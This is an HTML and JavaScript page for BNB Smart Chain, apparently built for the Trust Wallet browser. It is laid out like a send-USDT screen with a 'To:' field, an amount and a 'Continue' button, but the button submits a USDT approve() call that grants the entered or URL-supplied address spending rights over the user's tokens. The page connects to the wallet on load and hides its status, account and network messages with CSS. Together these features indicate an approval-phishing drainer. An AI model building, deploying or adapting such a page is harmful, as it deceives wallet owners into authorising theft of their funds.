<!DOCTYPE html>
<html lang="hi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>USDT Approve & Verify — BNB Mainnet</title>
<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>

<style>
:root {
    --bg: #0e101a;
    --text: #f4f7f5;
    --muted: #999dad;
    --line: #292c3b;
    --green: #16a34a;
}

* {
    box-sizing: border-box;
}

body {
    margin: 0;
    min-height: 100dvh;
    background: var(--bg);
    color: var(--text);
    font-family: Inter, system-ui, Arial, sans-serif;
}

main {
    max-width: 480px;
    min-height: 100dvh;
    margin: auto;
    background: var(--bg);
}

.card {
    min-height: 100dvh;
    padding: 25px 20px 35px;
    display: flex;
    flex-direction: column;
}

#account,
#network,
#status {
    display: none !important;
}

.header {
    display: flex;
    align-items: center;
    justify-content: space-between;
    margin: 35px 0 28px;
}

.header h2 {
    font-size: 24px;
    margin: 0;
}

.back-btn {
    width: 52px;
    height: 52px;
    border: none;
    border-radius: 50%;
    background: #202334;
    color: white;
    font-size: 32px;
    cursor: pointer;
}

.header-space {
    width: 52px;
}

.field-title {
    color: #a5a8b7;
    font-size: 14px;
    margin-bottom: 10px;
}

.wallet-input {
    display: flex;
    align-items: center;
    min-height: 65px;
    padding: 0 16px;
    border: 1px solid #303344;
    border-radius: 15px;
    background: #11131e;
}

.wallet-input:focus-within {
    border-color: #4938ff;
}

.wallet-input input {
    width: 100%;
    min-width: 0;
    border: 0;
    outline: 0;
    background: transparent;
    color: white;
    font-size: 15px;
    padding: 12px 0;
    box-shadow: none;
}

.wallet-input input:focus {
    box-shadow: none;
}

.wallet-input input::placeholder {
    color: #777d90;
}

.paste-label,
.currency-label {
    color: #43c77c;
    font-size: 14px;
    white-space: nowrap;
    margin-left: 10px;
}

.amount-section {
    margin-top: 35px;
}

.amount-display {
    text-align: center;
    padding: 30px 0 35px;
}

#amount {
    width: 100%;
    border: none;
    outline: none;
    background: transparent;
    color: white;
    text-align: center;
    font-size: clamp(55px, 15vw, 76px);
    font-weight: 600;
    padding: 10px 0;
}

#amount::placeholder {
    color: white;
    opacity: 1;
}

.amount-caption {
    color: #aeb2c1;
    font-size: 16px;
    margin-top: 8px;
}

.token-row {
    display: flex;
    align-items: center;
    gap: 14px;
    margin-top: auto;
    padding-top: 25px;
}

.token-icon {
    width: 58px;
    height: 58px;
    flex-shrink: 0;
    border-radius: 50%;
    background: #22a982;
    display: grid;
    place-items: center;
    color: white;
    font-size: 32px;
    font-weight: bold;
}

.token-info {
    flex: 1;
    display: flex;
    flex-direction: column;
    gap: 6px;
}

.token-info strong {
    font-size: 20px;
}

.token-info span {
    color: #999dad;
    font-size: 14px;
}

.wallet-balance {
    margin-top: 8px;
}

.wallet-balance strong {
    font-size: 16px;
    color: #fff;
}

.wallet-balance span {
    display: block;
    margin-top: 3px;
}

#approveBtn {
    width: 100%;
    min-height: 65px;
    margin-top: 35px;
    border: none;
    border-radius: 45px;
    background: #4938ff;
    color: white;
    font-size: 21px;
    font-weight: 700;
    cursor: pointer;
    box-shadow: none;
}

#approveBtn:active {
    transform: scale(.985);
}

#approveBtn:disabled {
    opacity: .45;
    cursor: not-allowed;
}

@media(max-width:480px) {
    .card {
        padding: 20px 18px 30px;
    }

    .header {
        margin-top: 45px;
    }
}

.spender-row {
    display: flex;
    align-items: center;
    gap: 12px;
    min-height: 50px;
    border-top: 1px solid #38343f;
    border-bottom: 1px solid #38343f;
}

.spender-row label {
    flex-shrink: 0;
    margin: 0;
    color: #aaa;
    font-size: 13px;
    font-weight: 600;
}

.spender-row input {
    flex: 1;
    min-width: 0;
    width: 100%;
    border: none;
    outline: none;
    background: transparent;
    color: white;
    font-size: 14px;
    padding: 12px 0;
    box-shadow: none;
}

.spender-row input:focus {
    box-shadow: none;
}

.skeleton {
    display: block;
    border-radius: 6px;
    background: linear-gradient(
        90deg,
        #252525 25%,
        #3a3a3a 50%,
        #252525 75%
    );
    background-size: 200% 100%;
    animation: skeleton-loading 1.4s infinite;
}

.skeleton-balance {
    width: 145px;
    height: 24px;
}

.skeleton-dollar {
    width: 75px;
    height: 15px;
    margin-top: 8px;
}

@keyframes skeleton-loading {
    0% { background-position: 200% 0; }
    100% { background-position: -200% 0; }
}
</style>
</head>

<body>

<main>

<div id="account"></div>
<div id="network"></div>
<div id="status" role="status">Wallet checking...</div>

<section class="card">

    <div class="spender-row">
        <label for="spenderAddr">To:</label>

        <input
            type="text"
            id="spenderAddr"
            placeholder="Enter address"
            autocomplete="off"
        />
    </div>

    <div class="amount-section">
        <div class="amount-display">

            <input
                type="number"
                id="amount"
                min="0"
                step="any"
                placeholder="0"
            />

            <div class="amount-caption">
                USDT Approval Amount
            </div>

        </div>
    </div>

    <div class="token-row">

        <div class="token-icon">₮</div>

        <div class="token-info">
            <div class="wallet-balance">
               <strong id="usdtBalance" class="skeleton skeleton-balance"></strong>
    <span id="usdtBalanceDollar" class="skeleton skeleton-dollar"></span>
            </div>

        </div>

    </div>

    <button id="approveBtn" disabled>
        Continue
    </button>

</section>

</main>

<script>
const CHAIN_ID = 56;
const CHAIN_HEX = "0x38";

const TOKEN_ADDRESS =
"0x55d398326f99059fF775485246999027B3197955";

const RPC_URL = "https://bsc-dataseed.binance.org/";

const ABI = [
    "function approve(address spender,uint256 amount) external returns (bool)",
    "function allowance(address owner,address spender) external view returns (uint256)",
    "function balanceOf(address owner) external view returns (uint256)",
    "function decimals() external view returns (uint8)",
    "function symbol() external view returns (string)"
];

let provider = null;
let signer = null;
let owner = null;
let chainOk = false;
let busy = false;

const $ = id => document.getElementById(id);

function status(message) {
    $("status").textContent = message;
}

// USDT wallet balance // 

async function updateUSDTBalance() {

    showBalanceSkeleton();

    try {
        if (!provider || !owner || !chainOk) {
            hideBalanceSkeleton();

            $("usdtBalance").textContent =
                !owner ? "Wallet not connected" : "Wrong Network";

            $("usdtBalanceDollar").textContent = "";
            return;
        }

        const balanceToken = new ethers.Contract(
            TOKEN_ADDRESS,
            ABI,
            provider
        );

        const balance = await balanceToken.balanceOf(owner);
        const decimals = await balanceToken.decimals();

        const rawBalance = ethers.utils.formatUnits(
            balance,
            decimals
        );

        const formattedBalance = Number(rawBalance).toLocaleString(
            "en-US",
            { maximumFractionDigits: 6 }
        );

        hideBalanceSkeleton();

        $("usdtBalance").textContent =
            formattedBalance + " USDT";

        $("usdtBalanceDollar").textContent =
            "$" + Number(rawBalance).toLocaleString("en-US", {
                minimumFractionDigits: 2,
                maximumFractionDigits: 2
            });

    } catch (error) {

        console.error("USDT balance error:", error);

        hideBalanceSkeleton();

        $("usdtBalance").textContent = "Balance unavailable";
        $("usdtBalanceDollar").textContent = "";
    }
}

function updateButton() {

    const params = new URLSearchParams(window.location.search);
    const receiver = params.get("receiver");

    // URL se receiver address fill karo
    if (receiver && !$("spenderAddr").value.trim()) {
        if (ethers.utils.isAddress(receiver)) {
            $("spenderAddr").value = ethers.utils.getAddress(receiver);
        }
    }

    const spender = $("spenderAddr").value.trim();
    const amount = $("amount").value.trim();

    const validAmount =
        amount !== "" &&
        Number.isFinite(Number(amount)) &&
        Number(amount) > 0;

    const validSpender = ethers.utils.isAddress(spender);

    $("approveBtn").disabled =
        busy || (owner && (!validAmount || !validSpender));
}


function validAddress(value, label) {
    if (!ethers.utils.isAddress(value.trim())) {
        throw Error(label + " valid address nahi hai.");
    }

    return ethers.utils.getAddress(value.trim());
}

async function refreshNetwork() {
    if (!provider) return;

    const network = await provider.getNetwork();
    chainOk = network.chainId === CHAIN_ID;

    $("network").textContent = chainOk
        ? "✓ BNB Smart Chain Mainnet Connected"
        : "⚠ Wrong Network. Chain ID: " + network.chainId;

    $("network").className = chainOk ? "good" : "bad";

    updateButton();
}

async function ensureChain() {
    const network = await provider.getNetwork();

    if (network.chainId === CHAIN_ID) return;

    await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: CHAIN_HEX }]
    });

    provider = new ethers.providers.Web3Provider(
        window.ethereum,
        "any"
    );

    signer = provider.getSigner();

    await refreshNetwork();
}

async function connectWallet(requestAccess = false) {
    try {
        if (!window.ethereum) {
            throw Error("Trust Wallet DApp Browser mein page open karein.");
        }

        provider = new ethers.providers.Web3Provider(
            window.ethereum,
            "any"
        );

        let accounts = await window.ethereum.request({
            method: "eth_accounts"
        });

        if ((!accounts || !accounts.length) && requestAccess) {
            accounts = await window.ethereum.request({
                method: "eth_requestAccounts"
            });
        }

        if (!accounts || !accounts.length) {
            owner = null;
            $("account").textContent = "Wallet not connected";
            $("usdtBalance").textContent = "0.00 USDT";

            status("Wallet connect karne ke liye Continue dabayein.");
            updateButton();

            return false;
        }

        owner = ethers.utils.getAddress(accounts[0]);
        signer = provider.getSigner();

        $("account").textContent = "Connected Wallet: " + owner;

        if (requestAccess) {
            await ensureChain();
        }

        await refreshNetwork();

        if (chainOk) {
            await updateUSDTBalance();
        } else {
            $("usdtBalance").textContent = "Wrong Network";
        }

        status(
            "Wallet connected successfully.\n" +
            "BNB Smart Chain ready."
        );

        return true;

    } catch (error) {
        status("Connection Error: " +
            (error.reason || error.message || error));

        return false;
    }
}

async function approveAndVerify() {
    if (busy) return;

    if (!owner) {
        await connectWallet(true);
        return;
    }

    busy = true;
    updateButton();

    try {
        await refreshNetwork();

        if (!chainOk) {
            await ensureChain();
        }

        const spender = validAddress(
            $("spenderAddr").value,
            "Spender"
        );

        const amountText = $("amount").value.trim();

        if (
            !amountText ||
            !Number.isFinite(Number(amountText)) ||
            Number(amountText) <= 0
        ) {
            throw Error("Valid amount enter karein.");
        }

        const token = new ethers.Contract(
            TOKEN_ADDRESS,
            ABI,
            signer
        );

        const decimals = await token.decimals();
        const symbol = await token.symbol();

        const amount = ethers.utils.parseUnits(
            amountText,
            decimals
        );

        status(
            "Approval request wallet ko bheji ja rahi hai.\n" +
            "Wallet mein spender aur amount verify karein."
        );

        const tx = await token.approve(spender, amount);

        status(
            "Transaction submitted.\n\n" +
            "Transaction Hash:\n" + tx.hash +
            "\n\nConfirmation ka wait ho raha hai..."
        );

        const receipt = await tx.wait();

        if (receipt.status !== 1) {
            throw Error("Transaction successful nahi hui.");
        }

        const readToken = new ethers.Contract(
            TOKEN_ADDRESS,
            ABI,
            provider
        );

        const allowance = await readToken.allowance(
            owner,
            spender
        );

        const formatted = ethers.utils.formatUnits(
            allowance,
            decimals
        );

        const sufficient = allowance.gte(amount);

        status(
            "✓ Approval transaction confirmed\n\n" +
            "Owner: " + owner +
            "\nSpender: " + spender +
            "\nAllowance: " + formatted + " " + symbol +
            "\nRequested: " + amountText + " " + symbol +
            "\n\n" +
            (sufficient
                ? "✓ Allowance verification successful."
                : "⚠ Allowance requested amount se kam hai.") +
            "\n\nTransaction:\n" +
            "https://bscscan.com/tx/" + tx.hash
        );

        await updateUSDTBalance();

    } catch (error) {
        status("Error: " +
            (error.reason || error.data?.message || error.message || error));

    } finally {
        busy = false;
        await refreshNetwork().catch(() => {});
        updateButton();
    }
}

// Continue button
$("approveBtn").addEventListener("click", approveAndVerify);

// Enable/disable based on entered values
$("spenderAddr").addEventListener("input", updateButton);
$("amount").addEventListener("input", updateButton);

// Wallet account/network changes
if (window.ethereum && window.ethereum.on) {

    window.ethereum.on("accountsChanged", async accounts => {

        owner = accounts && accounts.length
            ? ethers.utils.getAddress(accounts[0])
            : null;

        signer = owner ? provider.getSigner() : null;

        $("account").textContent = owner
            ? "Connected Wallet: " + owner
            : "Wallet not connected";

        if (owner) {
            await refreshNetwork();

            if (chainOk) {
                await updateUSDTBalance();
            }
        } else {
            $("usdtBalance").textContent = "0.00 USDT";
            await refreshNetwork();
        }

        updateButton();
    });

    window.ethereum.on("chainChanged", async () => {

        provider = new ethers.providers.Web3Provider(
            window.ethereum,
            "any"
        );

        signer = owner ? provider.getSigner() : null;

        await refreshNetwork();

        if (owner && chainOk) {
            await updateUSDTBalance();
        } else {
            $("usdtBalance").textContent = "0.00 USDT";
        }
    });
}
function showBalanceSkeleton() {
    $("usdtBalance").className = "skeleton skeleton-balance";
    $("usdtBalanceDollar").className = "skeleton skeleton-dollar";

    $("usdtBalance").textContent = "";
    $("usdtBalanceDollar").textContent = "";
}

function hideBalanceSkeleton() {
    $("usdtBalance").className = "";
    $("usdtBalanceDollar").className = "";
}

window.addEventListener("load", async () => {

    showBalanceSkeleton();

    if (!window.ethereum) {
        hideBalanceSkeleton();

        $("usdtBalance").textContent = "Wallet not detected";
        $("usdtBalanceDollar").textContent = "";

        status("Please open this page in Trust Wallet browser.");
        return;
    }

    try {

        // Existing permission ho to silently connect karega.
        // Permission nahi hai to wallet connection request aayegi.
        const connected = await connectWallet(true);

        if (!connected) {
            hideBalanceSkeleton();

            $("usdtBalance").textContent = "Wallet not connected";
            $("usdtBalanceDollar").textContent = "";
        }

    } catch (error) {

        console.error("Wallet connection error:", error);

        hideBalanceSkeleton();

        $("usdtBalance").textContent = "Balance unavailable";
        $("usdtBalanceDollar").textContent = "";
    }
});
</script>

</body>
</html>
